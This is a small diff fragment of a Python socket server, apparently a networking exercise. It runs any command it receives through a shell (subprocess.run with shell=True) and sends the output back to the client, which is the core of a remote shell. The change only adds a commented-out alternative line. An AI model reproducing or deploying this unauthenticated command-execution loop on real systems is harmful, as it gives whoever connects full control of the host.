@@ -39,6 +39,7 @@ while True:
             result = os.getcwd()
         else:
             result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
+            # result = subprocess.getoutput(cmd)
             if result == '':
                 result = "comando non valido\n"
         connectionSocket.send(result.encode(encoding='latin-1'))
